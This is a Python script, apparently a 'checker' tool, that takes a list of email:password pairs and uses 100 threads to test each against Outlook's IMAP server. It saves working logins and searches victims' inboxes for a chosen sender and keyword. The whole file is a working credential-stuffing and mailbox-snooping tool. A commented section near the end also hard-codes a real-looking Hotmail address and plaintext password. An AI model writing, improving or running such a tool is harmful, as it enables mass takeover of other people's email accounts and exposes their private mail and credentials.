import os
import json
import time
import ctypes
import concurrent.futures
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import pystyle
import colorama
# import easygui
import datetime
import imaplib
import email
import time
import datetime
import threading
from pystyle import Write, System, Colors, Colorate
from threading import Lock
from pystyle import Colors, Colorate,Write,Add
bad_proxies = []
from threading import Lock
lock = Lock()
Write.Print(f"""



███╗░░░███╗░██████╗████████╗██████╗░░█████╗░░█████╗░██╗░░██╗  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
████╗░████║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║░██╔╝  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
██╔████╔██║╚█████╗░░░░██║░░░██████╔╝██║░░██║██║░░╚═╝█████═╝░  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
██║╚██╔╝██║░╚═══██╗░░░██║░░░██╔══██╗██║░░██║██║░░██╗██╔═██╗░  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
██║░╚═╝░██║██████╔╝░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░░░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝




    """, Colors.red,interval=0.00)
keyword = input("keyword ->")
sender = input("sender ->")     

invalid = 0
good = 0
checked = 0
match = 0
def dele(email):
    global line
    with lock:
        with open("acc.txt", "r",encoding="utf-8") as f:
            lines = [line for line in f if email not in line]

        with open("acc.txt", "w",encoding="utf-8") as f:
            f.writelines(lines)

def update_counters(invalid_count, good_count, checked_count,matchv):
    global invalid ,good ,checked,match
    with lock:
        invalid += invalid_count
        good += good_count
        checked += checked_count
        match += matchv

def pri(text="none"):
    global invalid ,good ,checked,match
    with lock:
        print(f"\r {Fore.CYAN} checked:{checked}/{len(accounts)} | {Fore.RED}  invalid: {invalid} |{Fore.GREEN}  good: {good} |{Fore.CYAN} match:{match}",end="")

def tunnel_checker(email, password):
    global invalid ,good ,checked
    imap_server = "imap-mail.outlook.com"
    email_address = email
    password = password
    
    try:        
            imap = imaplib.IMAP4_SSL(imap_server)
            imap.login(email_address, password)
            Found = False
            neww = False
            # print()
            imap.select("Inbox")
            if keyword != "":
                # one_week_ago = datetime.datetime.now() - datetime.timedelta(weeks=1)
                # one_week_ago_str = one_week_ago.strftime("%d-%b-%Y")  # Format the date as required by the email server

                # # Modify the search query to search for emails with the keyword within the past week
                # search_query = f'(SINCE "{one_week_ago_str}" FROM "{sender}" SUBJECT "{keyword}")'
                # status, data = imap.search(None, 'ALL', search_query)
                # byte_string = data[0].decode('utf-8')
                # elements = byte_string.split()
                # length = len(elements)
                # count = length
                # print 
                # if count==0:
                #     neww = True
                # else:
                #     neww = False

                # if neww:
                    # Calculate the date one week ago
                    one_week_ago = datetime.datetime.now() - datetime.timedelta(weeks=1)
                    one_week_ago_str = one_week_ago.strftime("%d-%b-%Y")  # Format the date as required by the email server

                    # Modify the search query
                    search_query = f'(FROM "{sender}" SUBJECT "{keyword}")'
                    status, data = imap.search(None, 'ALL', search_query)
            # Search for all emails and get their IDs
                    # search_query = f'(SUBJECT "{keyword}" FROM "{sender}")'
                    # status, data = imap.search(None, 'ALL', search_query)
                    byte_string = data[0].decode('utf-8')
                    elements = byte_string.split()
                    length = len(elements)
                    count = length
                    Found = True
                    if all(not item for item in data):
                        # update_counters(0, 1, 1,0)
                        Found = False
                # print(f"{Fore.GREEN}[+]HIT {email+password} {Style.RESET_ALL}!")
            # print(count)
            

            if keyword != "" and Found:
                update_counters(0, 1, 1,1)
                pri()
                with open("good_hit.txt", "r", encoding='utf-8') as cum:
                    if str(email) not in str(cum.read()): 
                        with open("good_hit.txt", "a", encoding='utf-8') as cum:
                            
                            cum.write(f"{email}:{password} | keyword:{keyword}={count} \n")
            else:
                update_counters(0, 1, 1,0)
                pri()
                with open("email_good.txt", "r", encoding='utf-8') as cum:
                    if str(email) not in str(cum.read()): 
                        with open("email_good.txt", "a", encoding='utf-8') as cum:
                            cum.write(f"{email}:{password} \n")

    except Exception as e:
        # print(e)
        update_counters(1, 0, 1,0)
        pri()





accounts = []

with open('acc.txt', 'r',encoding="utf-8") as file:
    for line in file:
        line = line.strip()
        if ':' in line:
            try:
                email, password = line.split(':')
                accounts.append((email.strip(), password.strip()))
            except:
                continue

def process_account(email, password):
    tunnel_checker(email, password)

max_threads = 100

with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
    futures = [executor.submit(process_account, email, password) for email, password in accounts]
    concurrent.futures.wait(futures)



# # Start the timer
# start_time = time.time()
# imap_server = "imap-mail.outlook.com"
# email_address = "gulo9649_@hotmail.com"
# password = "Gulo123456"

# imap = imaplib.IMAP4_SSL(imap_server)
# imap.login(email_address, password)
# print("Logged in")

# imap.select("Inbox")
# _, data = imap.search(None, "ALL")
# msg_list = ','.join(data[0].decode('utf-8').split()) 
# _, msgs_data = imap.fetch(msg_list, "(RFC822)")
# # print(msgs_data)
# print("discord" in str(msgs_data))


# # # Your program logic goes here
# # # ...

# # # End the timer
# # end_time = time.time()

# # # Calculate the elapsed time
# # elapsed_time = end_time - start_time

# # # Print the elapsed time
# # print(f"Elapsed time: {elapsed_time} seconds")
